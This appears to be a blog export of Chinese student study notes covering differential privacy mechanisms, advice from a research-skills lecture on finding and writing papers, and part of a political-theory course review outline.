<h2 id="常见的查询函数及其敏感度（课件）"><a href="#常见的查询函数及其敏感度（课件）" class="headerlink" title="常见的查询函数及其敏感度（课件）"></a>常见的<strong>查询函数及其敏感度（课件）</strong></h2><p>（1）计数查询：计数问询（数据库SQL中的COUNT 算子）计算数据集中满足特定属性的行数。一般来说，<strong>计数问询的敏感度总等于1</strong>。这是因为向数据集中添加一行数据最多会使问询的。输出结果增加1，即当新增行满足特定属性时，计数结果加1。</p>
<p>（2）求和查询： 一般来说，当待求和的属性值不存在上界和下界时，我们称求和问询具有无界敏感度。当存在上下界时，<strong>求和问询的敏感度等于上下界的差。</strong></p>
<p>（3）均值查询：应用差分隐私回复均值问询的最简单方法是，将均值问询拆分为两个问询：求和问询除以计数问询。</p>
<p><img src="/2025/12/30/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image%2042.png" alt="image.png"></p>
<h2 id="拉普拉斯机制（P241）"><a href="#拉普拉斯机制（P241）" class="headerlink" title="拉普拉斯机制（P241）"></a>拉普拉斯机制（P241）</h2><p>（1）拉普拉斯机制的核心思想是：<strong>通过向中间件S加入服从拉普拉斯分布的噪声来满足差分隐私定义中的约束条件，</strong>即对于一个数据查询f，拉普拉斯机制首先生成真实结果f(x)作为中间件，然后通过发布带噪结果f(x)+Y来回答查询，其中噪声Y服从拉普拉斯分布。</p>
<p><strong>（2）差分隐私的核心</strong>在于其随机算法的设计：设计者<strong>首先需要证明算法输出的带噪中间件满足定义</strong>，然后在满足上述标准的情况下<strong>尽量少地加入噪音</strong>。</p>
<p><strong>（3）拉普拉斯机制是满足(ε, 0)-差分隐私的。</strong>拉普拉斯机制针对的是数值型回复，只需直接在回复的数值结果上增加噪声即可。如果我们想返回一个准确结果（即不能直接在结果上增加噪声），同时还要保证回复过程满足差分隐私，怎么办？<strong>指数机制</strong></p>
<h2 id="指数机制（P245）"><a href="#指数机制（P245）" class="headerlink" title="指数机制（P245）"></a>指数机制（P245）</h2><p>（1）此机制可以从<strong>备选回复集合</strong>中选出“最佳”回复的同时，保证回复过程满足差分隐私。分析者需要定义一个备选回复集合。</p>
<p>（2）同时，分析者需要指定一个评分函数，此评分函数输出备选回复集合中每个回复的分数。<strong>分数最高的回复就是最佳回复</strong>。指数机制通过返回分数近似最大的回复来实现差分隐私保护。</p>
<p>（3）换言之，为了使回复过程满足差分隐私，指数机制返回结果所对应的分数<strong>可能不是备选回复集合中分数最高的那个结果</strong>！</p>
<p>该机制与拉普拉斯机制最大的不同在于，后者适用于当<strong>数据查询的返回值为实数值</strong>的场合，而前者则适用于<strong>数据查询的范围值域为离散值域</strong>的场合。</p>
<h2 id="本地化差分隐私方法（P247）"><a href="#本地化差分隐私方法（P247）" class="headerlink" title="本地化差分隐私方法（P247）"></a>本地化差分隐私方法（P247）</h2><p>中心化差分隐私的问题：传统的差分隐私技术将原始数据集中到一个数据中心，然后发布满足差分隐私的相关统计信息，我们称之为中心化差分隐私技术。因此，中心化差分隐私对于敏感信息的保护始终基于一个前提假设：可信的第三方数据收集者，即保证第三方数据收集者不会窃取或泄露用户的敏感信息。然而，在实际应用中，即使第三方数据收集者宣称不会窃取和泄露用户的敏感信息，用户的隐私依旧得不到保障。</p>
<p>差分隐私本地模型：<strong>数据主体、数据管理者、数据使用者</strong></p>
<p>在LDP模型下的一些随机化机制包括<strong>随机响应机制、一元编码机制、哈希编码机制、子集选择机制、Hadamard响应机制以及用于键值数据</strong>的相关算法。</p>
<p>当数据管理者不可信时，不能将原始数据直接上传，要经过扰动处理。常见的技术是“随机扰动”。随机响应技术主要包括两个步骤：<strong>扰动性统计和校正</strong>。</p>
<p>我们将定义三个函数，这三个函数共同实现了一元编码机制：<strong>encode，编码应答值；perturb，扰动编码后的应答值；aggregate，根据扰动应答值，重构最终结果。</strong></p>
<h2 id="差分隐私在机器学习中的应用（P255）"><a href="#差分隐私在机器学习中的应用（P255）" class="headerlink" title="差分隐私在机器学习中的应用（P255）"></a>差分隐私在机器学习中的应用（P255）</h2><p>匿名化方法是较为常用的隐私保护的方法。在对外发布的数据库中，机构主体通常会将姓名等敏感信息做匿名化处理。但是，在大数据时代，由于可以获取到外部数据库，通过比对和关联分析，可以推理出敏感信息，而造成隐私信息泄露。因此匿名化方法往往无法提供良好的个人敏感信息保护。</p>
<p>在机器学习领域，如果不发布数据，而只发布训练模型，<strong>个人隐私仍然不能得到有效的保障，</strong>例如，模型的逆向攻击或者成员推理攻击，都可以通过对模型的解析推理窃取原始数据。因此，为了保护数据，我们需要寻找有数学保证的隐私保护方法。</p>
]]></content>
      <categories>
        <category>复习总结</category>
      </categories>
      <tags>
        <tag>期末复习</tag>
        <tag>大数据安全</tag>
      </tags>
  </entry>
  <entry>
    <title>科研学习记录</title>
    <url>/2025/12/15/%E7%A7%91%E7%A0%94%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong>转自11.28某科研讲座</strong></p>
<h2 id="如何判断论文水平"><a href="#如何判断论文水平" class="headerlink" title="如何判断论文水平"></a>如何判断论文水平</h2><h3 id="认可度与出版渠道"><a href="#认可度与出版渠道" class="headerlink" title="认可度与出版渠道"></a>认可度与出版渠道</h3><ul>
<li><p>认可度较高的期刊：ACM Transaction on … 、IEEE Transaction on …</p>
</li>
<li><p>出版商 &#x2F; 学会：ACM、IEEE、Elsevier、AAAI、CCF（中国计算机学会）</p>
</li>
</ul>
<h3 id="论文类型与分类"><a href="#论文类型与分类" class="headerlink" title="论文类型与分类"></a>论文类型与分类</h3><ul>
<li><p>论文类型：期刊论文、会议论文</p>
</li>
<li><p>中科院分区：一区、二区、三区、四区</p>
</li>
<li><p>CCF 分类：A 类、B 类、C 类</p>
</li>
</ul>
<h3 id="检索与索引"><a href="#检索与索引" class="headerlink" title="检索与索引"></a>检索与索引</h3><p>SCI、EI</p>
<h2 id="论文级别参考标准"><a href="#论文级别参考标准" class="headerlink" title="论文级别参考标准"></a>论文级别参考标准</h2><h3 id="中国计算机学会（CCF）推荐目录"><a href="#中国计算机学会（CCF）推荐目录" class="headerlink" title="中国计算机学会（CCF）推荐目录"></a>中国计算机学会（CCF）推荐目录</h3><ul>
<li><p>A 类 &gt; B 类 &gt; C 类 &gt; 其他</p>
<ul>
<li><a href="https://www.ccf.org.cn/Academic_Evaluation/By_category/">https://www.ccf.org.cn/Academic_Evaluation&#x2F;By_category&#x2F;</a></li>
</ul>
</li>
</ul>
<h3 id="中科院分区"><a href="#中科院分区" class="headerlink" title="中科院分区"></a>中科院分区</h3><ul>
<li><p>1 区 &gt; 2 区 &gt; 3 区 &gt; 4 区 &gt; 其他</p>
<ul>
<li><a href="http://www.letpub.com.cn/index.php?page=journalapp&view=search">http://www.letpub.com.cn/index.php?page=journalapp&view=search</a></li>
<li><a href="https://www.fenqubiao.com/">https://www.fenqubiao.com/</a></li>
<li>中科院分区查询公众号</li>
</ul>
</li>
</ul>
<h2 id="如何检索论文"><a href="#如何检索论文" class="headerlink" title="如何检索论文"></a>如何检索论文</h2><h3 id="检索网址"><a href="#检索网址" class="headerlink" title="检索网址"></a>检索网址</h3><h4 id="出版商官网"><a href="#出版商官网" class="headerlink" title="出版商官网"></a>出版商官网</h4><p><a href="https://ieeexplore.ieee.org/Xplore/home.jsp">https://ieeexplore.ieee.org/Xplore/home.jsp</a></p>
<h4 id="期刊-会议官网"><a href="#期刊-会议官网" class="headerlink" title="期刊 &#x2F; 会议官网"></a>期刊 &#x2F; 会议官网</h4><p><a href="https://signalprocessingsociety.org/publications-resources/ieee-transactions-image-processing">https://signalprocessingsociety.org/publications-resources/ieee-transactions-image-processing</a></p>
<h4 id="DBLP"><a href="#DBLP" class="headerlink" title="DBLP"></a>DBLP</h4><p><a href="https://dblp.org/">https://dblp.org/</a></p>
<h4 id="谷歌学术"><a href="#谷歌学术" class="headerlink" title="谷歌学术"></a>谷歌学术</h4><p><a href="https://scholar.google.com/%EF%BC%88%E9%9C%80%E8%A6%81%E7%BF%BB%E5%A2%99%EF%BC%89">https://scholar.google.com/（需要翻墙）</a></p>
<p><a href="https://scholar.dost.top/%EF%BC%88%E9%95%9C%E5%83%8F%EF%BC%89">https://scholar.dost.top/（镜像）</a></p>
<h3 id="基本检索流程"><a href="#基本检索流程" class="headerlink" title="基本检索流程"></a>基本检索流程</h3><p>访问网址、输入关键词检索、筛选结果、查阅论文信息、判断论文水平、下载优质论文</p>
<h2 id="科研工具"><a href="#科研工具" class="headerlink" title="科研工具"></a>科研工具</h2><h3 id="找论文"><a href="#找论文" class="headerlink" title="找论文"></a>找论文</h3><p>北邮图书馆外文资源、谷歌学术、百度学术、SCI-HUB、中国知网、Connected Papers</p>
<h3 id="找源码与复现"><a href="#找源码与复现" class="headerlink" title="找源码与复现"></a>找源码与复现</h3><p>论文中提供的 Git、GitHub 搜索论文名或作者名、作者个人主页 &#x2F; 实验室 Git、Papers with Code</p>
<h3 id="写作与辅助工具"><a href="#写作与辅助工具" class="headerlink" title="写作与辅助工具"></a>写作与辅助工具</h3><p>LaTeX、DBLP（文献引用）、Overleaf（协作写作）、ChatGPT、Origin、DeepL、谷歌翻译、Grammarly、Excel、PPT、Flaticon 图标</p>
<h3 id="投稿与会议信息"><a href="#投稿与会议信息" class="headerlink" title="投稿与会议信息"></a>投稿与会议信息</h3><p>CCF Deadlines、中国计算机学会官网、导师推荐、相关期刊官网、JCR 分区</p>
<h3 id="常用工具网址"><a href="#常用工具网址" class="headerlink" title="常用工具网址"></a>常用工具网址</h3><p><a href="https://www.deepl.com/zh/write">https://www.deepl.com/zh/write</a> —— 论文润色</p>
<p><a href="https://cn.overleaf.com/project">https://cn.overleaf.com/project</a> —— LaTeX 写作</p>
<p><a href="https://www.grammarly.com/">https://www.grammarly.com/</a> —— 英语语法修正</p>
<p><a href="https://paperswithcode.com/">https://paperswithcode.com/</a> —— 代码与数据集</p>
<p><a href="https://www.letpub.com.cn/index.php?page=journalapp&opennewwindow">https://www.letpub.com.cn/index.php?page=journalapp&opennewwindow</a> —— 投稿周期与经验</p>
<h2 id="如何阅读论文"><a href="#如何阅读论文" class="headerlink" title="如何阅读论文"></a>如何阅读论文</h2><h3 id="阅读原则"><a href="#阅读原则" class="headerlink" title="阅读原则"></a>阅读原则</h3><p>大量阅读论文，夯实科研基础</p>
<p>建议：每周精读 1 篇，粗读 ≥5 篇</p>
<h3 id="阅读类型"><a href="#阅读类型" class="headerlink" title="阅读类型"></a>阅读类型</h3><h4 id="预热性阅读"><a href="#预热性阅读" class="headerlink" title="预热性阅读"></a>预热性阅读</h4><p>知识输入、了解国内外研究现状、跟进领域最新进展</p>
<h4 id="批判性阅读"><a href="#批判性阅读" class="headerlink" title="批判性阅读"></a>批判性阅读</h4><p>判断研究是否合理、分析论证是否充分</p>
<h4 id="创造性阅读"><a href="#创造性阅读" class="headerlink" title="创造性阅读"></a>创造性阅读</h4><p>获取灵感、设计新算法、发现并解决新问题</p>
<h3 id="精读重点"><a href="#精读重点" class="headerlink" title="精读重点"></a>精读重点</h3><p>文章解决的初始问题、创新点与核心思想、新模型 &#x2F; 新算法设计思路、实验设计与验证方法、结果分析与优缺点评价</p>
<h3 id="泛读目标"><a href="#泛读目标" class="headerlink" title="泛读目标"></a>泛读目标</h3><p>把握研究方向整体情况、快速筛选高质量论文、阅读题目摘要、浏览章节结构与模型框架</p>
<h2 id="写作顺序和思路"><a href="#写作顺序和思路" class="headerlink" title="写作顺序和思路"></a>写作顺序和思路</h2><h3 id="论文基本模块"><a href="#论文基本模块" class="headerlink" title="论文基本模块"></a>论文基本模块</h3><ul>
<li>Abstract</li>
<li>Introduction</li>
<li>Related Work</li>
<li>Main Results（Theory &#x2F; Model &#x2F; Algorithm）</li>
<li>Experiments</li>
<li>Discussion</li>
<li>Conclusion</li>
</ul>
<h3 id="摘要与引言写作思路"><a href="#摘要与引言写作思路" class="headerlink" title="摘要与引言写作思路"></a>摘要与引言写作思路</h3><ol>
<li>介绍研究背景</li>
<li>指出现有场景中的问题</li>
<li>回顾已有解决方案</li>
<li>分析现有方案不足</li>
<li>提出本文解决方案</li>
<li>进行性能与安全性分析</li>
<li>总结方案优势</li>
</ol>
<h2 id="论文写作逻辑"><a href="#论文写作逻辑" class="headerlink" title="论文写作逻辑"></a>论文写作逻辑</h2><h3 id="3W2H-写作法"><a href="#3W2H-写作法" class="headerlink" title="3W2H 写作法"></a>3W2H 写作法</h3><p>1.Why：为什么做？</p>
<p>Motivation、Novelty、Significance</p>
<p>2.What：做了什么？</p>
<p>Contribution</p>
<p>3.How：怎么做？</p>
<p>Theorem &#x2F; Model &#x2F; Algorithm、清晰性、正确性、可复现性</p>
<p>4.How Much：效果如何？</p>
<p>Experiments、Discussion</p>
<p>5.What Then：接下来做什么？</p>
<p>Conclusion、启示与未来工作</p>
<h3 id="Motivation-展开方式"><a href="#Motivation-展开方式" class="headerlink" title="Motivation 展开方式"></a>Motivation 展开方式</h3><p>理论或应用需求、以往工作的不足、解决问题的潜在影响</p>
<h3 id="工具与实现"><a href="#工具与实现" class="headerlink" title="工具与实现"></a>工具与实现</h3><p>写作：TeXstudio + TeXlive</p>
<p>文献管理：DBLP</p>
<p>语言润色：ChatGPT</p>
<p>代码复现：GitHub + 自编代码</p>
<p>实验环境：Python</p>
<p>作图：Flaticon + PPT + Origin</p>
<p>投稿方式：学校邮箱 + 投稿系统</p>
<h2 id="如何面对科研焦虑"><a href="#如何面对科研焦虑" class="headerlink" title="如何面对科研焦虑"></a>如何面对科研焦虑</h2><h3 id="常见心理与应对方式"><a href="#常见心理与应对方式" class="headerlink" title="常见心理与应对方式"></a>常见心理与应对方式</h3><p>想不出来 → 那就安心地做</p>
<p>紧张 → 那就紧张地做</p>
<p>没有动力 → 那就没有动力地做</p>
<p>觉得自己菜 → 那就继续学着做</p>
<p>觉得没准备好 → 那就准备着做</p>
<h3 id="博士修行的“冰山模型”"><a href="#博士修行的“冰山模型”" class="headerlink" title="博士修行的“冰山模型”"></a>博士修行的“冰山模型”</h3><p>看得见的：论文、成果、奖励</p>
<p>看不见的：阅读、思考、失败、修改、坚持</p>
]]></content>
      <categories>
        <category>科研相关</category>
      </categories>
      <tags>
        <tag>科研工作</tag>
        <tag>科研学习</tag>
        <tag>科研工具</tag>
      </tags>
  </entry>
  <entry>
    <title>毛中特复习提纲</title>
    <url>/2025/06/16/%E6%AF%9B%E4%B8%AD%E7%89%B9%E5%A4%8D%E4%B9%A0%E8%B5%84%E6%96%99/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>授课：曲伟杰</p>
<p>&amp;的章节为2023级考试范围。</p>
<h3 id="导论"><a href="#导论" class="headerlink" title="&amp;导论"></a>&amp;导论</h3><p>1.一句话知识点：</p>
<p>（1）1840年鸦片战争以后，为近代史开端（？中国从农业社会向工业社会发展）</p>
<p>（2）1917年十月革命，给中国送来马列主义，给苦苦探寻救亡图存的中国人民指明了前进方向、提供了全新选择。</p>
<p>（3）1921年中国共产党，开天辟地大事，中国革命面貌焕然一新。</p>
<p>（4）1938年毛泽东在<strong>党的六届六中全会</strong>上作了<strong>《论新阶段》</strong>的报告，标志着<strong>马克思主义中国化</strong>这一命题正式提出。</p>
<p>（5）1978年党的十一届三中全会，开创中国特色社会主义。</p>
<p>2.为什么要推荐马克思主义中国化？</p>
<p><strong>（1）是马克思主义本身发展的内在要求。</strong>（马克思主义只有正确运用于实践并在实践中不断发展才能体现其科学性，彰显强大力量。只有实现中国化时代化，才能不断发展自身）</p>
<p><strong>（2）是解决中国实际问题的客观需要。</strong>（不能简单套用马克思主义一般原理照搬经验，要中国化时代化，结合中国国情，解决中国问题）</p>
<p>3.马克思主义中国化时代化内涵？（什么是马克思主义中国化时代化？）</p>
<p>（1）立足中国国情和时代特点，坚持把马克思主义基本原理同中国具体实际相结合、同中华优秀传统文化相结合</p>
<p>（2）深入研究和解决中国革命、建设、改革不同历史时期的实际问题，真正搞懂面临的时代课题。</p>
<p>（3）不断吸收新的时代内容，科学回答时代提出的重大理论和实践课题，创造新的理论成果。</p>
<p>4.马克思主义中国化时代化三层意思</p>
<p>（1）运用马克思主义的立场、观点和方法，观察时代、把握时代、引领时代，解决中国革命、建设、改革中实际问题。</p>
<p>（2）总结和提炼中国革命、建设、改革的实践经验并将其上升为理论，不断丰富和发展马克思主义的理论宝库，赋予马克思主义以新的时代内涵。</p>
<p>（3）运用中国人民喜闻乐见的民族语言来阐述马克思主义，使其植根于中华优秀传统文化的土壤之中，具有中国特色、中国风格、中国气派。</p>
<p>5.马克思主义中国化时代化的历史进程</p>
<p>在中国革命、建设、改革的历史进程中，马克思主义中国化实现了三大飞跃。</p>
<p>（1）第一次历史性飞跃：毛泽东思想</p>
<p>（2）新的飞跃：中国特色社会主义理论体系：邓小平理论、“三个代表“重要思想、科学发展观</p>
<p>（3）新的飞跃：习近平新时代中国特色社会主义思想</p>
<p>6.马克思主义中国化时代化<strong>理论成果（毛泽东思想，中国特色社会主义理论体系）</strong>及其关系？</p>
<p>关系：马克思主义中国化时代化的理论成果是<strong>一脉相承又与时俱进</strong>的关系。</p>
<p>（1）毛泽东思想所蕴含的马克思主义立场、观点和方法，为中国特色社会主义理论体系<strong>提供了基本遵循</strong>。</p>
<p>（2）中国特色社会主义理论体系在新的历史条件下进一步<strong>丰富和发展</strong>了毛泽东思想。</p>
<p>（3）毛泽东思想和中国特色社会主义理论体系，都是<strong>马克思列宁主义在中国的运用和发展</strong>，都以<strong>独创性的理论成果</strong>丰富和发展了马克思主义的理论宝库。</p>
<h3 id="第一章-毛泽东思想及其历史地位"><a href="#第一章-毛泽东思想及其历史地位" class="headerlink" title="第一章 毛泽东思想及其历史地位"></a>第一章 毛泽东思想及其历史地位</h3><h4 id="第一节-毛泽东思想的形成和发展"><a href="#第一节-毛泽东思想的形成和发展" class="headerlink" title="第一节 毛泽东思想的形成和发展"></a>第一节 毛泽东思想的形成和发展</h4><p>1.一句话知识点：</p>
<p>（1）中国特殊国情：半殖民地半封建社会</p>
<p>（2）<strong>八七会议</strong>确定实行<strong>土地革命和武装起义</strong>的方针</p>
<p>（3）第一块革命根据地：<strong>井冈山</strong></p>
<p>2.毛泽东思想形成发展的历史条件历史条件</p>
<p>（1）国内条件：近代中国社会特殊国情和中国革命特殊性</p>
<p>（2）国际条件：俄国十月革命胜利开辟了世界无产阶级社会主义革命的新时代</p>
<p>（3）实践基础：中国共产党成立</p>
<p>3.毛泽东思想形成发展的过程</p>
<p>（1）大革命时期，毛泽东以马克思列宁主义为指导，深入实际调查研究，在<strong>《中国社会各阶级的分析》、《湖南农民运动考察报告》</strong>等著作中，明确指出<strong>无产阶级领导农民斗争的极端重要性</strong>，分析了中国农民斗争的特点，强调了无产阶级领导农民斗争在推翻反动政权、建立人民革命政权中的重大作用。</p>
<p>（2）土地革命时期，党从残酷的现实斗争中认识到，夺取中国革命胜利，就必须<strong>坚持以武装的革命反对武装的反革命</strong>。</p>
<p>（3）以毛泽东同志为主要代表中国共产党人，坚持马克思列宁主义必须与中国革命具体实际相结合的基本原则，成功把党的工作重点由城市转入农村，<strong>开辟了农村包围城市、武装夺取政权</strong>的革命道路。</p>
<p>（4）毛泽东在<strong>《中国的红色政权为什么能够存在？》《井冈山的斗争》《星星之火可以燎原》《反对本本主义》</strong>指出中国革命发展规律：<strong>将党的工作重点从城市转入农村。标志毛泽东思想初步形成。</strong></p>
<p>2.毛泽东思想的成熟</p>
<p>（1）<strong>遵义会议（1935.1）是一次具有伟大转折意义的重要会议</strong>。开始确立以毛泽东同志为主要代表的马克思主义正确路线在党中央的领导地位，开始形成以毛泽东同志为核心的党的第一代中央领导集体，开启了党独立自主解决中国革命实际问题的新阶段，在危急时刻挽救了党、挽救了红军、挽救了中国革命。</p>
<p>（2）遵义会议后，毛泽东系统<strong>总结了党领导中国革命特别是全民族抗日战争以来的历史经验</strong>，在《实践论》、《矛盾论》两篇著作分析“左”的错误。在<strong>《&lt;共产党人&gt;发刊词》、《中国革命和中国共产党》、《新民主主义论》、《改造我们的学习》、《论联合政府》</strong>等理论著作中<strong>系统阐述了新民主主义革命理论</strong>，实现了马克思主义与中国革命实践相结合的历史性飞跃，标志着<strong>毛泽东思想得到多方面展开而趋于成熟。</strong></p>
<p>（3）党的六届七中全会通过《关于若干历史问题的决议》充分肯定了确立<strong>毛泽东在全党领导地位的重大意义。</strong></p>
<p>（4）1945年党的七大通过的《中国共产党党章》明确规定，“中国共产党，以马克思列宁主义的理论与中国革命的实践统一的思想——毛泽东思想，作为自己一切工作的指针“。<strong>标志着把毛泽东思想确立为党必须长期坚持的指导思想。</strong></p>
<h4 id="第二节-毛泽东思想的主要内容和活的灵魂（重点）"><a href="#第二节-毛泽东思想的主要内容和活的灵魂（重点）" class="headerlink" title="&amp;第二节 毛泽东思想的主要内容和活的灵魂（重点）"></a>&amp;第二节 毛泽东思想的主要内容和活的灵魂（重点）</h4><p>*三湾改编：创造性地将支部建在连上，从组织上确立了党对军队的领导，是建设无产阶级领导的新型人民军队的重要开端。</p>
<p><em>毛泽东思想的活的灵魂：1981年党的第十一届六中全会通过的《中国共产党中央委员会关于建国以来党的若干历史问题的决议》指出：“毛泽东思想的活的灵魂，是贯串于上述各个组成部分的立场、观点和方法，*<em>它们有三个基本方面，即实事求是，群众路线，独立自主。</em></em></p>
<p>1.实事求是</p>
<p>（1）实事求是<strong>是毛泽东思想的基本点，是毛泽东思想的精髓（单选题），是中国共产党的思想路线。</strong></p>
<p>（2）定义：就是一切从实际出发，理论联系实际，坚持在实践中检验真理和发展真理。</p>
<p>（3）这条思想路线由毛泽东确立于民主革命时期。1930年，他在《反对本本主义》中强调调查研究是一切工作的第一步，提出了“没有调查，没有发言权”的著名论断。</p>
<p>（4）1938年，他在党的六届六中全会上，借用我国传统文化的“实事求是”命题，来提倡马克思主义同中国实际相结合的科学态度。</p>
<p>（5）毛泽东还把实事求是形象地比喻为“有的放矢”，强调我们要坚持用马克思主义之“矢”去射中国革命之“的”。<strong>经过延安整风和党的七大，实事求是的思想路线在全党得到了确立。</strong></p>
<p>2.群众路线</p>
<p>（1）群众路线，就是一切为了群众，一切依靠群众，从群众中来，到群众中去，把党的正确主张变为群众的自觉行动。</p>
<p>（2）群众路线都是我们党的生命线和根本工作路线。</p>
<p>（3）群众路线本质上体现的是马克思主义关于人民群众是历史的创造者这一基本原理。</p>
<p>（4）坚持群众路线，就要坚持人民是推动历史发展的根本力量。</p>
<p>（5）坚持群众路线，就要坚持全心全意为人民服务的根本宗旨。</p>
<p>（6）坚持群众路线，就要保持党同人民群众的血肉联系。</p>
<p>3.独立自主</p>
<p>（1）独立自主，就是坚持独立思考，走自己的路，就是坚定不移地维护民族独立、捍卫国家主权，把立足点放在依靠自己力量的基础上，同时积极争取外援，开展国际经济文化交流。</p>
<p>（2）1930年，<strong>毛泽东在《反对本本主义》一文中指出：</strong>“中国革命斗争的<strong>胜利要靠中国同志了解中国情况。</strong>”这是独立自主思想的最初明确表述。（单选题，什么文章？）</p>
<p>（3）坚持独立自主，就是要坚持中国的事情必须由中国人民自己作主张，自己来处理。</p>
<p>（4）坚持独立自主，就要坚持独立自主的和平外交政策，坚定不移走和平发展道路。</p>
<h4 id="第三节-毛泽东思想的历史地位（重点！）"><a href="#第三节-毛泽东思想的历史地位（重点！）" class="headerlink" title="第三节 毛泽东思想的历史地位（重点！）"></a>第三节 毛泽东思想的历史地位（重点！）</h4><p>1.历史地位</p>
<p><strong>（1）马克思主义中国化时代化的第一个重大理论成果：毛泽东思想与马克思列宁主义理论关系</strong></p>
<p><strong>（2）中国革命和建设的科学指南：毛泽东思想与中国革命和建设实践关系</strong></p>
<p><strong>（3）中国共产党和中国人民宝贵的精神财富：毛泽东思想与中国共产党的关系</strong></p>
<p>2.小知识点：</p>
<p>（1）正确认识毛泽东思想的历史地位和指导意义，有一个怎样科学评价毛泽东和毛泽东思想的问题。</p>
<p><strong>（2）《中国共产党中央委员会关于建国以来党的若干历史问题的决议》对毛泽东和毛泽东思想的历史地位做出了科学的、实事求是的评价。</strong></p>
<p>（3）总的来说，毛泽东的功绩是第一位的，错误是第二位的。将毛泽东晚年的错误同经过长期历史检验形成科学理论的毛泽东思想区别开来，为我们完整准确地理解毛泽东思想、坚持和发展毛泽东思想指明了方向。</p>
<h3 id="第二章-新民主主义革命理论"><a href="#第二章-新民主主义革命理论" class="headerlink" title="第二章 新民主主义革命理论"></a>第二章 新民主主义革命理论</h3><h4 id="第一节-新民主主义革命理论形成的依据"><a href="#第一节-新民主主义革命理论形成的依据" class="headerlink" title="第一节 新民主主义革命理论形成的依据"></a>第一节 新民主主义革命理论形成的依据</h4><p>1.近代中国国情主要矛盾</p>
<p><strong>占支配地位的主要矛盾是帝国主义和中华民族的矛盾（这又是各种矛盾中最主要的矛盾）、封建主义和人民大众的矛盾。</strong></p>
<p>2.新民主主义革命理论的实践基础</p>
<p>（1）旧民主主义（1840-1919）革命的失败呼唤新的革命理论。</p>
<p>（2）新民主主义（1919之后）革命的艰辛探索奠定了革命理论形成的实践基础。</p>
<h4 id="第二节-新民主主义革命"><a href="#第二节-新民主主义革命" class="headerlink" title="&amp;第二节 新民主主义革命"></a>&amp;第二节 新民主主义革命</h4><p>1.小知识点</p>
<p>（1）区别新旧两种不同范畴的民主主义革命的根本标志是，<strong>革命的领导权是掌握在无产阶级手中还是掌握在资产阶级手中。</strong></p>
<p>（2）（单选）近代中国半殖民地半封建社会的性质和中国革命的历史任务，决定了新民主主义革命的<strong>性质不是无产阶级社会主义革命，而是资产阶级民主主义革命。</strong></p>
<p>（3）新民主主义革命与社会主义革命又是互相联系、紧密衔接的。毛泽东<strong>把新民主主义革命和社会主义革命比喻为文章的上篇和下篇。</strong></p>
<p>（4）新民主主义基本纲领（革命工作干什么?）：1945年，毛泽东在<strong>党的七大</strong>所作的政治报告《论联合政府》中，进一步把新民主主义的<strong>政治、经济和文化与党的基本纲领</strong>联系起来具体阐述。</p>
<p>2.新民主主义革命总路线（重要，单选）</p>
<p>（1）1939年，毛泽东在<strong>《中国革命和中国共产党》</strong>一文中第一次提出了“新民主主义的革命”<strong>科学概念。</strong></p>
<p>（2）1948年，毛泽东在《在晋绥干部会议上的讲话》中完整地总结和概括了新民主主义革命总路线的内容，即无产阶级领导的、人民大众的，反对帝国主义、封建主义和官僚资本主义的革命。</p>
<p>（3）指明了中国革命的<strong>对象、动力、领导力量、性质和前途。</strong></p>
<p>3.新民主主义革命的对象<strong>（三座大山）（单选）</strong></p>
<p>（1）<strong>帝国主义</strong>是中国革命的<strong>首要对象。</strong></p>
<p>（2）<strong>封建地主阶级</strong>是帝国主义统治中国和封建军阀实行专制统治的<strong>社会基础。</strong></p>
<p>（3）<strong>官僚资本主义</strong>是依靠帝国主义、勾结封建势力、利用国家政权力量而发展起来的买办的、封建的国家垄断资本主义。</p>
<p>4.新民主主义革命动力<strong>（四颗小五角星）</strong></p>
<p>（1）<strong>无产阶级</strong>是中国革命<strong>最基本</strong>的动力</p>
<p>（2）<strong>农民是中国革命的主力军（重要！单选）</strong></p>
<p>（3）<strong>城市小资产阶级</strong>是无产阶级的<strong>可靠同盟者，</strong>包括广大知识分子、小商人、手工业者和自由职业者。</p>
<p>（4）<strong>民族资产阶级</strong>也是中国革命的动力之一。半殖民地半封建社会的民族资产阶级是一个带有两面性的阶级，动摇妥协又革命。</p>
<p>5.中国无产阶级特点与优点</p>
<p>（1）中国无产阶级具有<strong>与先进的生产方式相联系、没有私人占有的生产资料、富于组织纪律性</strong>等一般无产阶级的基本优点。</p>
<p>（2）中国无产阶级在革命斗争中比任何别的阶级<strong>都来得坚决和彻底。</strong></p>
<p>（3）<strong>它集中分布在少数大城市和大企业</strong>，有利于组织和团结，利于革命思想传播与强大革命力量。</p>
<p>（4）它的成员中<strong>大部分出身于破产农民</strong>，和农民有着天然的联系。</p>
<p>6.新民主主义革命相比旧民主主义革命的<strong>新的内容与特点</strong></p>
<p>（1）是<strong>世界无产阶级社会主义革命</strong>的一部分。</p>
<p>（2）革命领导力量是中国无产阶级及其先锋队——<strong>中国共产党</strong>。</p>
<p>（3）革命的指导思想是<strong>马克思列宁主义</strong>。</p>
<p>（4）革命的前途是<strong>社会主义</strong>而不是资本主义。</p>
<p>7.新民主主义的政治纲领</p>
<p>（1）推翻帝国主义和封建主义的统治，建立一个<strong>无产阶级领导的、以工农联盟为基础的、各革命阶级联合专政的</strong>新民主主义的共和国。</p>
<p>（2）新民主主义共和国既不同于欧美式的资产阶级专政的共和国，又和苏联式（各革命阶级联合）的无产阶级专政的社会主义共和国相区别。</p>
<p>（3）新民主主义国家的国体：<strong>无产阶级领导的以工农联盟为基础，包括小资产阶级、民族资产阶级和其他反帝反封建的人们在内的各革命阶级的联合专政</strong>。</p>
<p>（4）与新民主主义国体相适应的政体，是<strong>实行民主集中制的人民代表大会制度。</strong></p>
<p>8.新民主主义经济纲领（两没收一保护）</p>
<p>（1）<strong>没收封建地主阶级的土地归农民所有</strong>，是新民主主义革命的<strong>主要内容</strong>。进行土地革命，实行“耕者有其田”，把土地变成农民的私产。</p>
